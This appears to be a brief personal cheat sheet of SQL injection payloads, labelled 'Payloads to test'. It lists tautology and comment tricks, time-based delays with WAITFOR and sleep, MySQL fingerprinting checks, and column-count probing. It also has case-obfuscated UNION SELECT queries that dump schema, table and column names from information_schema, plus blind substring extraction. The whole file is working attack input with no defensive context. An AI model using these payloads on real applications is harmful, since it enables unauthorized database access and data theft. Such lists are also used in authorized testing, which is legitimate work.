# Havent type 

"""
Payloads to test
or 1=1 --

1' WAITFOR DELAY '0:0:10'

["conv('a',16,2)=conv('a',16,2)" ,"MYSQL"],
["connection_id()=connection_id()" ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')" ,"MYSQL"],

1' ORDER BY 1--+

1' GROUP BY 1--+

1' UNION SELECT null--

-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]

AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'

AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -

1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
"""